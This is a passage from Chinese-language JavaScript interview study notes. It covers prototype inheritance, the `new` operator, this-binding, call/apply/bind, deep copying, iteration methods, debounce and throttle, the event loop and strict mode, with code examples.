	//将构造函数指向子类型
	clone.constructor=subType;
	subType.prototype=clone;
}

function Super(name){
	this.name=name;
}
Super.prototype.getSuper=function(){
	return this.name;
}

function Sub(name){
	Super.call(this,name);  //第二次调用，构造函数继承
}


// 优化前：
// Sub.prototype = new Super();        //第一次调用
// Sub.prototype.constructor = Sub;
// 优化后：
inheritPrototype(Sub,Super);

var sub1=new Sub("sub1");  //创建Sub的实例sub1,

console.log(sub1.getSuper());  //sub1
console.log(sub1.name);  //  sub1
console.log(sub1 instanceof Sub);  // true
console.log(sub1 instanceof Super);  // true

var sub2=new Sub("sub2");  //创建Sub的实例sub2

console.log(sub2.getSuper());  // sub2
console.log(sub2.name);  //sub2
```

子类对超类型的原型对象的继承，分为以下几个步骤：

（1）、封装一个 inheritPrototype 函数

（2）、利用object（或Object.create()）复制出超类型的原型对象

（3）、将原型对象的构造函数指向自身（把名字改成自己的：clone.constructor = subType，**constructor相当于一张身份证，身份证上的名字一定得是自己）**

（4）、将拷贝出来的对象传递给子类的原型对象

结合性记忆：原型链继承+构造函数继承 = 组合继承；为了优化: 组合继承→原型式继承→寄生式继承→寄生组合式继承



---

## 2 请问js在new过程中到底做了什么？

在js日常开发中，常new一个构造函数或类得到对应实例，下面代码分别是利用ES5 构造函数与ES6 class类实现一个简单的创建实例

```js
// ES5 构造函数 
var Parent = function (name, age) {     
    this.name = name;     
    this.age = age; 
}; 
Parent.prototype.sayName = function () {           
    console.log(this.name); 
}; 
var child = new Parent('echo', 26); 
child.sayName() //echo

//ES6 class类
class Parent {     
    constructor(name, age) {         
        this.name = name;         
        this.age = age;     
    }     
    sayName() {         
        console.log(this.name);     
    } 
}; 
const child = new Parent('echo', 26); 
child.sayName() //echo
```

对于var child = new Parent('echo', 26)，要创建 Parent 的新实例，必须使用 new 操作符，以这种方式调用构造函数有以下几个步骤：

（1）、创建一个新对象，如var child =｛｝

（2）、新对象的`_proto_`属性指向构造函数的原型对象，

（3）、将构造函数的作用域赋给新对象（因此 this 就指向了这个新对象）

（4）、执行构造函数中的代码，将属性添加给child中的this对象

（5）、若构造器没有手动返回对象，则返回第一步创建的对象（新对象child）

通俗理解：在new一个对象时，新对象（新实例）没有prototype属性，所以把prototype属性赋值给新对象的`_proto_`属性

**`new`** 关键字会进行如下的操作：

1. 创建一个空的简单JavaScript对象（即`{}`）；
2. 为步骤1新创建的对象添加属性`__proto__`，将该属性链接至构造函数的原型对象 ；
3. 将步骤1新创建的对象作为`this`的上下文 ；
4. 如果该函数没有返回对象，则返回`this`。



---

## 3. 请问如何js原生方法实现new方法？

可根据上题中的new()操作步骤加以理解性记忆，下面是参考代码：

```js
//定义 new 方法
let newMethod = function(Parent, ...rest){

	// 1.以构造器的prototype属性为原型，创建新对象；
	let newObj = Object.create(Parent.prototype);

	// 2.将this和调用参数传给构造器执行
	let result = Parent.apply(newObj, rest);

	// 3.如果构造器没有手动返回对象，则返回第一步的对象（4）
	return typeof result==="object" ? result : newObj;
};

function Person(name,age){
	this.name=name;
	this.age=age;
}

let person=newMethod(Person,"kop",66);
console.log(person.name);  // kop
console.log(person.age);  //66
```

---

## 4. 请问你了解js中的this绑定机制吗？

this特点：

1. this是js的关键字之一，**它是对象自动生成的一个内部对象**，只能在对象内部使用
2. 随着使用场合的不同，this的值会发生变化，并不是一成不变的
3. this指向完全取决于：**什么地方以什么方式调用**，而不是 创建时

this 4种绑定机制：默认绑定、隐式绑定、显示绑定、new绑定，箭头函数的this不适用于这4种绑定机制，需要单独分析

### (1) 默认绑定

（函数调用时无任何调用前缀的情景）  没有其他绑定规则存在时的默认规则，**也是函数调用中最常见情况**

```js
function fn1(){
  let fn2 = function(){
    console.log(this);  //Window
    fn3();
  };
  console.log(this);  //Window
  fn2();
};

function fn3(){
  console.log(this);  //Window
};

fn1();

/*
<ref *1> Object [global] {
  global: [Circular *1],
  clearInterval: [Function: clearInterval],
  clearTimeout: [Function: clearTimeout],
  setInterval: [Function: setInterval],
  setTimeout: [Function: setTimeout] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  },
  queueMicrotask: [Function: queueMicrotask],
  performance: Performance {
    nodeTiming: PerformanceNodeTiming {
      name: 'node',
      entryType: 'node',
      startTime: 0,
      duration: 107.68200016021729,
      nodeStart: 0.7476000785827637,
      v8Start: 7.08810019493103,
      bootstrapComplete: 55.69720005989075,
      environment: 25.186300039291382,
      loopStart: -1,
      loopExit: -1,
      idleTime: 0
    },
    timeOrigin: 1652074920565.308
  },
  clearImmediate: [Function: clearImmediate],
  setImmediate: [Function: setImmediate] {
    [Symbol(nodejs.util.promisify.custom)]: [Getter]
  }
}
*/
```

代码中无论函数声明在哪，在哪调用，**由于函数调用时前面并未指定任何对象，这种情况下this指向全局对象window**

注意：在严格模式下（use strict），全局对象将无法使用默认绑定，会报undefined错误

```js
function fn1(){
  console.log(this);  //Window
  console.log(this.a);  // 1
}

function fn2(){
  "use strict";
  console.log(this);  //undefined
  console.log(this.a);  // Uncaught TypeError: Cannot read properties of undefined (reading 'a')
}

var a=1;

fn1();
fn2();

```

### (2) 隐式绑定

在函数调用时，前面存在调用它的对象，即函数的调用是在该对象上触发的，**调用位置上存在上下文对象，那this就会隐式绑定到该对象上**

```js
function foo(){
    console.log(this.a);
}

var a=2;

foo();  // 2

var obj={
    a:3,
    foo:foo
};

obj.foo();  // 3
```

代码中foo函数被当做引用属性，被添加到obj对象上。调用过程：获取obj.foo属性→ 根据引用关系找到foo函数，执行调用

这里对foo的调用存在上下文对象obj，**this进行了隐式绑定，即this绑定到了obj上，this.a被解析成了obj.a**

多层调用链（面试高频考题）（函数调用前存在多个对象，**this指向距离调用自己最近的对象**）

```js
function foo(){
	console.log(this.a);
}

var a=2;

var obj1={
	a:4,
	foo:foo
};

var obj3 = {
	b:10,
	foo: foo
}

var obj2={
	a:3,
	obj1:obj1,
	obj3: obj3,
	foo:foo
};


foo();  // 2
obj1.foo();  // 4
obj2.foo();  // 3
obj2.obj1.foo();  //4

obj2.obj3.foo();  // undefined
```

代码中调用链不只一层，存在obj1、obj2两个对象，先获取obj2.obj1→通过引用获取到obj1对象，再访问 obj1.foo →最后执行foo函数调用，获取最后一层调用的上下文对象，即obj1，所以结果是4（obj1.a）

#### 隐式丢失

在一些特殊情况下，**会存在隐式绑定丢失问题**，最常见：参数传递、变量赋值

##### **参数传递**

```js
function foo(){
	console.log(this.a);
}

function fn1(param){
	param();
}

var a=2;

var obj1={
	a:4,
	foo:foo
};

fn1(obj1.foo);  // 2
```

代码中将 obj.foo 作为参数传递进 fn1 中执行，**只是单纯地传递了一个函数而已**，this并没有跟函数绑在一起，**发生了隐式丢失**，this依旧指向window

##### **变量赋值（本质上与传参相同）**

```js
function foo(){
  console.log(this.a);
}

var a=2;

var obj1 = {
  a:4,
  foo:foo
};

let fn1 = obj1.foo;
fn1();  // 2

```

### (3) 显式绑定（call、apply、bind）

```js
function foo(){
	console.log(this.a);
}

var a=4;

let obj1={
	a:1,
};
let obj2={
	a:2,
};
let obj3={
	a:3,
};

foo();  // 4
foo.call(obj1);  // 1
foo.apply(obj2);  // 2

foo.bind(obj3)();  // 3

foo.apply(null);  // 4




foo.apply(undefined);  // 4
foo.bind(null)();  // 4
foo.bind(undefined)();  // 4
```

代码中，我们分别通过call、apply、bind改变了函数fn的this指向

通常，js中调用一个函数时（函数调用），函数处于一个被动的状态，**而call与apply让函数从被动变主动**，函数能主动选择自己的上下文，这种写法又称之为**函数应用**

注意：若使用函数应用的方法改变this指向时，**指向参数是null或者undefined，那么 this 将指向全局对象**

### (4) new 绑定

```js
function Fn(){
	this.a=1;
}

let obj = new Fn();

console.log(obj.a);  // 1
```

代码中，构造函数调用创建了一个新对象obj，**而在函数体内，this将指向新对象obj上**（可以抽象理解为新对象就是this）

---

### **this绑定优先级**

如果一个函数调用存在多种绑定方法，this最终指向是什么呢？this绑定优先级为：

显式绑定 > 隐式绑定 > 默认绑定

new绑定 > 隐式绑定 > 默认绑定

注意：**不存在显式绑定和new绑定同时生效的场景**，若同时写会直接报错

---

## 5.作用域链与原型链有什么区别？

作用域链：当**访问一个变量**时，首先在当前作用域查找标识符，如果没有找到就去**父作用域**找，作用域链**顶端**是全局对象window，如果window都没有这个变量则**报错**

原型链：当**在对象上访问某属性**时，首先会查找当前对象，如果没有就顺着**原型链**往上找，原型链**顶端**是null，如果全程都没找到则**返回undefined**，而不是报错



---

## 6. 请问call、apply与bind有什么区别？

call、apply与bind：都能用于改变this绑定

**apply与call：**

都是函数应用，**指定this的同时也会执行函数**，参数传递方式不同

call与apply的绑定**只适用当前调用，调用完毕即失效**，下次要用还得重新绑

**call：**接受一个参数列表，第一个参数指向this，**其余的参数在函数执行时都会作为函数形参传入函数**

**apply：**除了第一个参数作为this指向外，其它参数都被包裹在一个**数组**中，在函数执行时同样会作为形参传入

```js
let o = {
    a: 1
};
function fn(b, c) {
    console.log(this.a + b + c);
};
// fn.call(this, arg1, arg2, ...);
fn.call(o, 2, 3); // 6
// fn.apply(this, [arg1, arg2, ...]);
fn.apply(o, [2, 3]); // 6
```

**bind：**

绑定this后**并不会立马执行**，而是**返回一个全新的boundFcuntion绑定函数**

bind属于**硬绑定**，返回的boundFunction的this指向**无法再次**通过bind、apply或 call **修改**

```js
let obj1={
	a:1
}
let obj2={
	a:2
}

function fn(b,c){
	console.log(this.a + b + c);
}

let fn1=fn.bind(obj1, 2, 3);

fn1();  //6

//尝试再次传入形参
fn1(4,4);  // 6

//尝试改变this
fn1.call(obj2);  //6
```

代码中， 当执行fn1时，**本质上等于window.fn1()**，如果this还能被改变，那this岂不是得指向window，那bind方法就毫无意义了



----

## 7. 请问什么是浅拷贝？什么是深拷贝？两者有何区别？

深拷贝与浅拷贝简单区分方法：假设B复制了A，当修改A时，B是否改变，若B也跟着变化，说明是**浅拷贝**；若B没变化，则是**深拷贝**

注意：一般情况下，**深拷贝只针对较为复杂的object类型数据**

在js中， 分基本数据类型与引用数据类型，这两类数据存储分别是：

**基本数据类型**：名与值都存储在**栈内存**中，例如let a=1：

| 名   | 值   |
| ---- | ---- |
| a    | 1    |

当b=a时，b复制了a的值，栈内存会新开辟一个内存给b，例如：

| 名   | 值   |
| ---- | ---- |
| a    | 1    |
| b    | 1    |

当修改a=2时，对b并不会造成影响，因为此时的b具有独立的存储空间，不受a的影响了

----

**引用数据类型**：名存在**栈内存**中，值存在于**堆内存**中，栈内存会提供一个引用的地址指向堆内存中的值

![img](E:\pogject\学习笔记\image\js\CED43FA80498C5A06F84AEBC056ECA6F)

当b=a时，其实b复制了a的引用地址，而并非堆内存中的值

![img](E:\pogject\学习笔记\image\js\967F55AE7D26B8CCB6590C26CFCDAD2B)

而当a[0]=1时进行数组修改时，由于a与b指向的是同一个地址，自然b也受影响，这就是所谓的浅拷贝

![img](E:\pogject\学习笔记\image\js\E829A2CEBAE11215E510B538F34432B5)

----

## 8. 请问js如何实现深拷贝？

### (1) 递归复制所有层级属性

（面试高频撕代码题）

可理解为一层层地复制对象中的属性， 直到值为基础类型，缺点：代码较为复杂

```js
//使用递归的方式实现数组、对象的深拷贝

function deepClone(obj){
    //判断要进行深拷贝的是数组还是对象，是数组的话进行数组拷贝，对象的话进行对象拷贝
    var objClone = Array.isArray(obj) ? [] : {};
    //进行深拷贝的不能为空，并且是对象
    if (obj && typeof obj === "object") {
        for (let key in obj){
            if (obj.hasOwnProperty(key)) {
                if (obj[key] && typeof obj[key] === "object") {
                    objClone[key] = deepClone(obj[key]);
                } else {
                    objClone[key] = obj[key];
                }
            }
        }
    }
    return objClone;
}

let obj1={
    a:1,
    b:{
        c:2
    },
    d:[3,4,5],
    e:true,
    f: function() {
        console.log("abc");
    }
}

let obj2=deepClone(obj1);

obj2.b.c=66;

console.log(obj1.b.c);  //2
console.log(obj2.b.c);  //66
obj2.f();  // abc
```



### (2) 借助JSON对象的parse和stringify

利用js的内置对象JSON来进行**数组对象**的深拷贝，缺点：无法实现对象中**方法**的深拷贝

```js
function deepClone(obj){
	var _obj = JSON.stringify(obj);
	var objClone = JSON.parse(_obj);
	return objClone;
}

let nums = [1, 2, 3];
let nums2 = deepClone(nums);
nums[1] = 4;
console.log(nums);  //  [ 1, 4, 3 ]
console.log(nums2);  //  [ 1, 2, 3 ]

let obj = {
	a: 1,
	foo : function(){
		console.log("foo");
	}
}

let obj2 = deepClone(obj);

console.log(obj);  //  { a: 1, foo: [Function: foo] }
console.log(obj2);  //  { a: 1 }
```

stringify() → JavaScript对象序列化为JSON字符串

parse() → 把JSON字符串解析为原生JavaScript值



### (3) 通过jQuery的extend方法

```js
var array = [1,2,3,4];
var newArray = $.extend(true, [], array);
```



### (4) Object.assign()拷贝

当对象中只有一级属性，**没有二级属性的时候，此方法为深拷贝**，但是对象中有对象的时候，**此方法，在二级属性以后就是浅拷贝**

```js

let obj1={
	a:1,
	b:{
		c:2
	},
	d:[3,4,5],
	e:true
}

let obj2=Object.assign({}, obj1);

obj2.b.c=66;
obj2.a=10;

console.log(obj1.a);  //1
console.log(obj2.a);  //10

console.log(obj1.b.c);  //66
console.log(obj2.b.c);  //66
```



### (5) lodash函数库

lodash是一个很热门的函数库，可利用lodash.cloneDeep()实现深拷贝

这个方法类似[`_.clone`](https://www.lodashjs.com/docs/lodash.cloneDeep#clone)，除了它会递归拷贝 `value`。（注：也叫深拷贝）。

```bash
$ cnpm i lodash --save
```

```js
var _ = require("lodash");

let obj1={
	a:1,
	b:{
		c:2
	},
	d:[3,4,5],
	e:true
}

let obj2=_.cloneDeep(obj1);

obj2.b.c=66;
obj2.a=10;

console.log(obj1.a);  //1
console.log(obj2.a);  //10

console.log(obj1.b.c);  //2
console.log(obj2.b.c);  //66
```



---

## 9. 请问js如何判断一个变量是空对象？

### (1) for in 

利用for in 循环遍历对象和对象原型上的**可枚举属性**

缺点：**只能遍历可枚举属性**，若一个对象上只有不可枚举属性的话，会判断错误

```js
function isEmptyObj(obj){
	for (let i in obj){
		return false;  //能遍历，不为空
	}
	return true;
}

let a={};
let b=[];
let c="";

console.log(isEmptyObj(a));  // true
console.log(isEmptyObj(b));  // true
console.log(isEmptyObj(c));  // true
```



### (2)  Object.keys() 

```js
console.log(Object.keys(obj).length === 0)
```

Object.keys能返回对象自身上**所有可枚举属性的名称**所构成的数组，若数组长度为0，那就是一个空对象

缺点：如for in断一样，Object.keys方法也只返回可枚举属性

```js
let a={};
let b=[];
let c="";

console.log(Object.keys(a).length===0);  // true
console.log(Object.keys(b).length===0);  // true
console.log(Object.keys(c).length===0);  // true
```

### (3) 将对象转化为json字符串

```js
console.log(JSON.stringify(obj) === '{}')
```

```js
let a={};
let b=[];
let c="";

console.log(JSON.stringify(a));  // {}
console.log(JSON.stringify(b));  // []
console.log(JSON.stringify(c));  // ""
```

### (4) Object.getOwnPropertyNames()

```js
console.log(Object.getOwnPropertyNames(obj).length === 0)
```

Object.getOwnPropertyNames方法获取到对象中的属性名，存到一个数组中，**返回数组对象**，若数组长度为0，则是空对象

缺点：此方法是Object.keys的改进，**可获取到不可枚举属性**，**但该方法无法获取Symbol属性**

```js
let a={
    [Symbol("a")]:1
};
let b=[];
let c="";

console.log(Object.getOwnPropertyNames(a).length===0);  // true

console.log(Object.getOwnPropertyNames(b));  // [ 'length' ]
console.log(Object.getOwnPropertyNames(b).length===0);  // false

console.log(Object.getOwnPropertyNames(c));  // [ 'length' ]
console.log(Object.getOwnPropertyNames(c).length===0);  // false
```

###   (5) Reflect.ownKeys()

```js
console.log(Reflect.ownKeys(obj).length === 0)
```

Reflect.ownKeys也可以返回对象自身属性名所构成的数组，**该方法可以返回不可枚举属性以及Symbol属性**

```js
let a={
	[Symbol("a")]:1
};
let b=[];
let c="";

console.log(Reflect.ownKeys(a).length===0);  // false
console.log(Reflect.ownKeys(b).length===0);  // true
console.log(Reflect.ownKeys(c).length===0);  // TypeError: Reflect.ownKeys called on non-object
```

---

## 10. 什么可枚举属性？什么是不可枚举属性？

可枚举属性是指内部**可枚举标志**（enumerable）设置为true的属性，不可枚举属性即是enumerable为false（摘自MDN）

---

### **js遍历对象各个方法区别总结**

| 方法                           | 基本属性 | 原型链属性 | 不可枚举属性 | symbol属性 |
| ------------------------------ | -------- | ---------- | ------------ | ---------- |
| for in                         | ✔        | ✔          | ✖            | ✖          |
| Object.keys()                  | ✔        | ✖          | ✖            | ✖          |
| Object.getOwnPropertyNames()   | ✔        | ✖          | ✔            | ✖          |
| Object.getOwnPropertySymbols() | ✖        | ✖          | ✔            | ✔          |
| Reflect.ownKeys()              | ✔        | ✖          | ✔            | ✔          |

**for in （遍历key）**：可遍历到原型对象上的属性 ，用hasOwnProperty()方法过滤, 可遍历得到字符串类型的键值，**通常不适用于数组遍历**

**Object.values() 、Object.keys() ：**可自动过滤原型链上的属性

**Object.getOwnPropertyNames()：**可遍历不可枚举的属性

**Reflect.ownkeys()：** 可遍历不可枚举的属性 和 Symbol属性



---

## 11. 请问js有哪些遍历数组的方法？

###  (1) for循环

用临时变量将长度缓存起来，避免重复获取数组长度，当数组较大时优化效果比较明显，写法比较繁琐

```js
for(let j = 0,len=arr.length; j < len; j++) {
    
}
```

###  (2) forEach（）

遍历数组中的每一项，没有返回值，即使有return，也不会返回任何值，对原数组没有影响，不支持IE浏览器，**执行速度比map()快**

```js
//参数：item数组中的当前索引的值, index当前项的索引, array原始数组
arr.forEach((item,index,array)=>{
    
})    
```

###   (3) map（）

**创建一个新的数组，新数组的每一个元素由调用数组中的每一个元素执行提供的函数得来**，有return返回值

return的意义：不影响原来的数组，**只是把原数组克隆一份**，改变克隆的数组中的对应项

```js
let a = [1,2,3,4,5];

let b = a.map((item,index,arr)=>{
	return item**2;
});

console.log(a);  //[ 1, 2, 3, 4, 5 ]
console.log(b);  // [ 1, 4, 9, 16, 25 ]
```



###   (4) for of

遍历value，适用遍历数组对象、字符串、map、set等**拥有迭代器对象**的集合，**不能遍历对象**，**因为没有迭代器**

与forEach()区别：**可以正确响应break、continue和return语句**

与for in 区别：**无法循环遍**历对象，**不会遍历自定义属性**

```js
for (var value of arr) { 
    console.log(value); 
}

let a=[1,2,3,4,5];

for (let i of a){
	console.log(i);  // 1 2 3 4 5
}

let obj={
	a:1,
	b:2
}

for (let o of obj){  //TypeError: obj is not iterable
	console.log(o);
}
```

### (5) reduce()

接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，得出最终计算值

相当于：**为数组中的每一个元素依次执行回调函数**，不包括数组中被删除或从未被赋值的元素

```js
arr.reduce(function(total, currentValue, currentIndex, arr), initialValue)
```

各参数意义：

| function()   | 必需 | 用于执行每个数组元素的函数     |
| ------------ | ---- | ------------------------------ |
| total        | 必需 | 初始值, 或者计算结束后的返回值 |
| currentValue | 必需 | 当前元素                       |
| currentIndex | 可选 | 当前元素的索引                 |
| arr          | 可选 | 当前元素所属的数组对象         |
| initialValue | 可选 | 传递给函数的初始值             |

一起看几个reduce()的实际应用（面试时可能要求撕代码）

- **简单用法：数组求和，求乘积**

```js
let a=[1,2,3,4,5];

console.log(a.reduce((prev,curr,index,arr) => prev+curr));  //15
console.log(a.reduce((prev,curr,index,arr) => prev*curr));  //120

```

- **复杂用法：**

计算数组中每个元素出现的次数

```js
let nums=[1,2,3,4,5,2,3,5];

let ans=nums.reduce((prev,curr)=>{
	if (curr in prev) {
		prev[curr]++;
	}else{
		prev[curr]=1;
	}
	return prev;
},{})
console.log(ans);  //{ '1': 1, '2': 2, '3': 2, '4': 1, '5': 2 }

```

数组去重（ 面试高频撕代码题）

```js
let nums=[1,2,3,4,5,2,3,5];

let ans=nums.reduce((prev,curr)=>{
	if (!prev.includes(curr)) {
		return prev.concat(curr);
	}else{
		return prev;
	}
},[])
console.log(ans);  //[ 1, 2, 3, 4, 5 ]

```

将多维数组转化为一维（又名数组扁平化， 面试高频撕代码题）

```js
let nums=[1,2,3,[4,5,[2,3]],5];

var FlatArr=function(arr){
	return arr.reduce((prev,curr)=>prev.concat(Array.isArray(curr) ? FlatArr(curr) : curr),[]);
}

let ans=FlatArr(nums);
console.log(ans);  //[1, 2, 3, 4, 5, 2, 3, 5 ]

```



----

## 12. 请问什么是函数防抖？什么是函数节流？

**函数防抖**(debounce)：触发高频事件后n秒内，函数只会执行一次，如果n秒内高频事件再次被触发，则重新计算时间

**函数节流**(throttle)：高频事件触发，但在n秒内只会执行一次，所以节流会稀释函数的执行频率

两者**都是为了限制函数的执行频次**，以优化函数触发频率过高导致的响应速度跟不上触发频率，出现延迟，假死或卡顿的现象

可结合下图对两者进行区分：

![img](https://uploadfiles.nowcoder.com/images/20211008/897353_1633667352451/6AF15ACD40C68A84BAD11D4A2F5981F6)

**防抖：**

实现思路：在事件被触发n秒后再执行回调函数，如果在这n秒内又被触发，则重新计时

特点：如果事件在规定的时间间隔内被不断的触发，则调用方法被不断的延迟，**当遇到不断触发但是仍然需要触发的情况，应该选用节流**

只有当高频事件停止，**最后一次事件触发的超时调用才能在wait时间后执行**

```js
function debounce(fn,wait){
	var timeout;  //用来存放定时器的返回值，一触发就重新计时
	return function(){
		var context=this;
		//把前一个 setTimeout clear 掉
		clearTimeout(timeout);
		//又创建一个新的 setTimeout,保障间隔时间内持续触发，不会执行fn函数
		timeout=setTimeout(function(){
			fn.apply(context);
		},wait);
	}
}
```

防抖 (debounce)

防抖，顾名思义，防止抖动，以免把一次事件误认为多次，敲键盘就是一个每天都会接触到的防抖操作。

特点：等待某种操作停止后，加以间隔进行操作

- 持续触发不执行
- 不触发的一段时间之后再执行

想要了解一个概念，必先了解概念所应用的场景。在 JS 这个世界中，有哪些防抖的场景呢

1. 登录、发短信等按钮避免用户点击太快，以致于发送了多次请求，需要防抖
2. 调整浏览器窗口大小时，resize 次数过于频繁，造成计算过多，此时需要一次到位，就用到了防抖
3. 文本编辑器实时保存，当无任何更改操作一秒后进行保存
4. `mousemove` 鼠标滑动事件
5. Select 去服务端动态搜索功能

代码如下，可以看出来**防抖重在清零 `clearTimeout(timer)`**

```javascript
function debounce (f, wait) {
  let timer
  return (...args) => {
    clearTimeout(timer)
    timer = setTimeout(() => {
      f(...args)
    }, wait)
  }
}
```

---

**节流：**（每隔一段时间发一次 Ajax 请求，用节流）

规定一个单位时间，**在这个单位时间内，只能有一次触发事件的回调函数执行**，如果在同一个单位时间内某事件被触发多次，只有一次能生效

实现思路：通过判断是否到达一定时间来触发函数，**若没到规定时间则使用计时器延后**，而下一次事件则会重新设定计时器

```js
function throttle(fn,delay){
	let canRun=true;  //通过闭包保存一个标记
	return function(){
		//在函数开头判断标记是否为true,不为true 则return
		if (!canRun) {
			return;
		}
		//立即设置为false
		canRun=false;
		//将外部传入的函数的执行放在setTimeout中
		setTimeout(()=>{
			//最后在setTimeout执行完毕后再把标记设置为true(关键)表示可以执行下一次循环了
			//当定时器没有执行的时候标记永远是false,在开头被return掉
			fn.apply(this,arguments);
			canRun=true;
		},delay);
	};
}
```

节流 (throttle)

节流，顾名思义，控制水的流量。控制事件发生的频率，如控制为1s发生一次，甚至1分钟发生一次。与服务端(server)及网关(gateway)控制的限流 (Rate Limit) 类似。

特点：每等待某种间隔后，进行操作

- 持续触发并不会执行多次
- 到一定时间 / 其它间隔 ( 如滑动的高度 )再去执行

1. `scroll` 事件，每隔一秒计算一次位置信息等
2. 浏览器播放事件，每个一秒计算一次进度信息等
3. input 框实时搜索并发送请求展示下拉列表，没隔一秒发送一次请求 (也可做防抖)
4. 埋点场景。商品搜索列表、商品橱窗等，用户滑动时 定时 / 定滑动的高度 发送埋点请求
5. 运维系统查看应用运行日志时，每 n 秒刷新一次

代码如下，可以看出来**节流重在开关锁 `timer=null`**

```javascript
function throttle (f, wait) {
  let timer
  return (...args) => {
    if (timer) { return }
    timer = setTimeout(() => {
      f(...args)
      timer = null
    }, wait)
  }
}
```



----

## 13.  请问你了解js事件循环机制（Event Loop）吗？

js是一门主要运行在浏览器的脚本语言，主要用途之一是操作DOM元素

若js同时有两个线程，对同一个DOM元素进行操作，这时浏览器应该听哪个线程的？如何判断优先级？为了避免这种问题，js必须是一门单线程语言。

**主线程**：即主线程会不停的从执行栈中读取事件，直至执行完所有栈中的同步代码

**任务队列**：当遇到一个异步事件后，js并不会一直等待异步事件返回结果，而是会将这个事件挂在与执行栈不同的队列中，即任务队列

**异步任务**：分为 宏任务（macrotask） 与 微任务 (microtask)，不同的API注册的任务会依次进入自身对应的队列中，然后等待 Event Loop 将它们依次压入执行栈中执行

**常见宏任务**(macrotask)：

script(整体代码)、setTimeout、setInterval、UI 渲染、 I/O、postMessage、 MessageChannel、setImmediate(Node.js 环境)

**常见微任务**(microtask)：

Promise、 MutaionObserver、process.nextTick(Node.js环境）

Event Loop(事件循环)：宏任务 > 所有微任务 > 宏任务（主要针对V8）

1. 执行栈选择最先进入队列的宏任务(通常是script整体代码)，如果有则执行
2. 检查是否存在 Microtask，如果存在则不停地执行，直至清空 microtask 队列
3. 更新render(每一次事件循环，浏览器都可能会去更新渲染)
4. 重复以上步骤

![img](E:\pogject\学习笔记\image\js\7F695AB6524E72C0BC007BEFD17FC007)

一起看两道经典面试题：（主要考察执行顺序问题，考察频率极高）

```js
//题目一

setTimeout(function(){
	console.log(1);
});

new Promise(function(resolve,reject){
	console.log(2);
	resolve();
}).then(function(){
	console.log(3);
});

console.log(4);

// 2 4 3 1
```

**先执行script同步代码**：先执行Promise中的console.log(2)，再执行console.log(4)

**再执行微任务**：Promise的then函数

最后执行定时器中的console.log(1)，最终输出顺序为：2，4，3，1

注意：**对于Promise，本身是同步的**， **Promise.then是异步的**

```js
//题目二（稍微复杂一点，建议结合分析多看几遍）

console.log("script start");

async function async1(){
    //await  操作符用于等待一个Promise 对象。它只能在异步函数 async function 中使用。
	await async2();
	console.log("async1 end");
}

async function async2(){
	console.log("async2 end");
}

async1();

setTimeout(function(){
	console.log("setTimeout");
},0);

new Promise(function(resolve,reject){
	console.log("Promise");
	resolve();
}).then(function(){
	console.log("promise1");
}).then(function(){
	console.log("promise2");
});

console.log("script end");

/*
script start
async2 end
Promise
script end
async1 end
promise1
promise2
setTimeout
*/
```

首先执行同步代码：

（1）、执行 console.log('script start')

（2）、执行 async1() ，马上执行 async2函数：console.log('async2 end')

（3）、执行 new Promise()中的同步函数：console.log('Promise')

（4）、最后执行 console.log('script end')，同步代码执行完毕

看剩下的异步代码：

（5）、setTimeout是宏任务，留到最后

----

剩下微任务：

```js
async function async1() {
  await async2()
  console.log('async1 end') 
}
new Promise(resolve => {
  resolve()
})
.then(function() {
  console.log('promise1') 
})
.then(function() {
  console.log('promise2') 
})
```

（6）、根据队列的先入先出方式，先执行 await async2() 后面的函数 console.log('async1 end') 

（7）、执行promise的resolve函数

```js
new Promise(resolve => { resolve() })
```

也就是两个then： console.log('promise1') 、console.log('promise2')

（8）、 最后执行宏任务 setTimeout函数 console.log('setTimeout')

综上所述，以上代码执行的顺序是：

“script start”、“async2 end”、“Promise”、“script end”、“async1 end”、“promise1”、 “promise2 ”、“setTimeout”



----

## 14. 请问setTimeout与setInterval有何区别？

setTimeout() 是在载入后，延迟指定时间后，去执行一次表达式，次数只有一次

setInterval() 是指定某个任务每隔一段时间就执行一次，可以无限次的定时执行

通俗理解：setTimeout()是**延时器**，setInterval()是**定时器**

注意：setTimeout和setInterval都是不能保证时间精度的，他们的第二个参数（延时）**只能保证何时把代码添加到浏览器的任务队列中**，**不能保证添加到队列就会立即执行**

若队列前面还有其他任务，主线程被占用，那么就要等这些任务执行完再执行



---

## 15.  请问js有哪几种方式创建对象？

1. 使用 Object 直接创建对象

```js
// 创建对象
var newObj = new Object()；
// 添加属性
newObj.property1 = value1;
newObj.property2 = value2;
// 添加方法
newObj.method1 = function () { };
newObj.method2 = function (a, b, c) { };
```

2. 使用new关键字调用 构造器 创建对象

```js
// 创建对象
function 对象名（参数1，参数2…）{
    this.property1 = 参数1;
    this.method1 = function ( ) { }
}
// 使用对象
var obj = new 对象名（参数1，参数2）;  
```

3. 使用JSON创建对象 （JOSN格式中**属性名要加双引号**）

```js
var object = {属性名1：属性值1，属性名2：属性值2，.....}
```

4. 组合使用**构造函数**和**原型模式**

```js
function Student(name, sex, grade){     
    this.name=name;     
    this.sex=sex;     
    this.grade=grade; 
}   
Student.prototype.sayName=function(){        
    console.log(this.name); 
}   
Student.prototype.school="nongda";
```

构造函数用于**定义实例的属性**，原型模式用于**定义方法和共享的属性**，可极大节约内存



-----

## 16. 请问你了解js严格模式吗？

设立"严格模式"的意义：

- 消除js语法中的一些不合理、不严谨之处，减少一些怪异行为
- 消除代码运行的一些不安全之处，保证代码运行的安全
- 提高编译器效率，增加运行速度

使用"use strict"便可进入严格模式，通常有**两种**调用方法：

**针对整个文件**：将"use strict"放在文件的第一行，则**整个文件都将以"严格模式"运行**。

**针对单个函数**：将"use strict"放在函数体的第一行，则**整个函数以"严格模式"运行**。

严格模式与非严格模式的一些常见区别：

- 在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。**严格模式禁止这种用法，全局变量必须显式声明**，然后再使用

```js
'use strict'
a = 1 // 严格模式下将报错，非严格模式a变量会提升至全局作用域
```

- 严格模式**创建了第三种作用域：eval作用域**

正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。**严格模式下，eval语句本身就是一个作用域**，不再能够生成全局变量了，**它所生成的变量只能用于eval内部**

```js
'use strict'
eval('var a = 1')
console.log(typeof a) // 严格模式下为undefined;非严格模式下为number
```

- **禁止this关键字指向全局对象**，使用构造函数时，**如果忘了加new，this不再指向全局对象**
- **禁止删除变量**（ delete x）； 删除对象上不存在的属性也会报错

```js
function usualMode() {
    function fn() {} 
    var a = 1
    delete a // 不会报错，但实际上也没能删除变量a
    delete fn // 同delete a
}
usalMode() // 正常执行
 
function strictMode() {
